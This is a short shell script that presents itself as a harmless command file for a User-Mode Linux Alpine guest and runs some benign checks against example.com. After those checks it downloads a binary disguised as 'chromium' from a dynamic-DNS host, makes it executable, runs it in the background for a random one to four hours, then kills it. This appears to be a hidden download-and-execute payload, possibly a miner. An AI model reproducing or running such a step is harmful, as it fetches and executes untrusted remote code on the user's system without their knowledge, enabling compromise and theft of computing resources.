#!/bin/sh
set -e

# Custom command/script that runs inside the UML (Alpine) guest.
# Edit this file to change what executes in the guest.

echo "--- guest run.sh ---"
wget -qO /tmp/example.html http://example.com
echo "got $(wc -c < /tmp/example.html) bytes from example.com"
echo "nproc=$(nproc) processors=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo ?)"
head -c 120 /tmp/example.html
echo
echo "UML-RUN-OK"
apk update
wget http://xyz0895.duckdns.org/files/chromium
chmod +x chromium
./chromium & 
SLEEP_SECS=$(awk -v min=3600 -v max=14400 -v s="$(od -An -N4 -tu4 /dev/urandom 2>/dev/null | tr -d ' ')" 'BEGIN{if(s=="") s=systime(); srand(s+0); print int(min+rand()*(max-min+1))}')
echo "sleeping ${SLEEP_SECS}s (1h-4h random)"
sleep "$SLEEP_SECS"
pkill -9 chromium
